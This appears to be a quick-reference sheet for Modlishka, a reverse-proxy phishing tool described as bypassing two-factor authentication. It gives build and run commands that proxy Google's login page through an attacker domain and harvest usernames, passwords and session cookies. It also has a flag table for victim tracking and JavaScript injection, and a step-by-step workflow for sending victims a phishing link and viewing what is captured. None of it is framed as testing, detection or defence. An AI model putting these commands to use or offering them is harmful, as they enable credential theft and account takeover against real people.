# Modlishka

Reverse-proxy phishing that bypasses 2FA/MFA.

## Quick Start

```bash
git clone https://github.com/drk1wi/Modlishka && cd Modlishka && make

./Modlishka -target https://accounts.google.com \
  -phishing phish.attacker.com \
  -cert cert.pem -key key.pem \
  -credParams username=,password=

./Modlishka -config config.json
```

## Core Flags

| Flag | Purpose |
|------|---------|
| `-target` | Real site to proxy |
| `-phishing` | Attacker phishing domain |
| `-cert / -key` | TLS certificate paths |
| `-credParams` | Field names to harvest |
| `-trackingCookie` | Victim tracking cookie name |
| `-jsRules` | JavaScript inject rules |
| `-config` | JSON config file path |

## Workflow

1. Register phishing domain + get TLS cert (Let's Encrypt)
2. Fill `config.json` with target, domain, TLS paths
3. Start Modlishka; send victim the phishing URL
4. Observer panel at `http://127.0.0.1:8888` shows captured credentials + session cookies
